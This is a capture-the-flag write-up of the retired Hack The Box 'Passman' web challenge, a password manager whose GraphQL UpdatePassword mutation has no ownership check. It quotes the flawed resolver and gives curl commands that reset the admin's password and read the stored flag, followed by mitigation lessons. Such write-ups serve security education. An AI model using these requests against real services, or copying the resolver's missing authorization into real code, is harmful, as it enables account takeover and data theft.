---
challenge: Passman
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, graphql, idor, broken-access-control, source-review]
---

# Passman — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A password manager with **source code** and a **GraphQL** API. The `UpdatePassword` mutation never checks who owns the account: **IDOR / broken access control**. Change `admin`'s password, log in as them, and the flag sits there as a stored password.

## Brief

"Pandora suspects a mole in the ministry and needs the master password, which lives in a password manager." Source is provided, and `entrypoint.sh` seeds the database.

## Analysis

```bash
unzip passman.zip && cd passman
cat entrypoint.sh
grep -rn "GraphQL\|mutation\|UpdatePassword" --include=*.js .
```

`entrypoint.sh` shows the initial `INSERT`: user `admin` exists with a password that *is* the flag, and a `saved_passwords` table holds an entry for them.

```javascript
// helpers/GraphqlHelper.js
UpdatePassword: {
  type: ResponseType,
  args: { username: { type: new GraphQLNonNull(GraphQLString) },
          password: { type: new GraphQLNonNull(GraphQLString) } },
  resolve: async (root, args, request) => {
    // no ownership check, no JWT verification for the target user
    return db.updatePassword(args.username, args.password);
  }
}
```

The mutation accepts any `username` and never compares it to the token's identity: another user's password can be changed.

## Exploitation

1. **Register and log in** to get a valid JWT:

```bash
curl -s -X POST http://<IP>:<port>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ RegisterUser(email:\"a@a.a\",username:\"x\",password:\"x\"){ message } }"}'
```

```bash
TOKEN=$(curl -s -X POST http://<IP>:<port>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ LoginUser(username:\"x\",password:\"x\"){ token } }"}' \
  | jq -r '.data.LoginUser.token')
```

2. **Change `admin`'s password** through the vulnerable mutation:

```bash
curl -s -X POST http://<IP>:<port>/graphql \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation{ UpdatePassword(username:\"admin\",password:\"Pwned123!\"){ message } }"}'
```

3. **Log in as admin** and read their stored passwords:

```bash
curl -s -X POST http://<IP>:<port>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ LoginUser(username:\"admin\",password:\"Pwned123!\"){ token } }"}'
```

With the admin token, the saved-password query returns the flag:

```graphql
{ getPhrase(username: "admin") { address username password } }
```

## Pitfalls

- **Introspection**: if disabled, the source gives exact mutation and field names.
- **JWT**: a normal user's token is enough to call the mutation; no forging needed.
- **Format**: GraphQL needs `Content-Type: application/json`; a form `POST` returns a syntax error.
- **New password**: satisfy any registration policy, or the `update` fails silently.

## Lessons

- GraphQL brings no authorization by itself: every resolver must check resource ownership.
- A `username` argument is an IDOR invitation; it belongs in the token, not the client.
- Code review finds this in minutes; automated scanning almost never does.
- Mitigation: derive the user from the JWT, enforce ownership on each mutation, and restrict introspection in production.
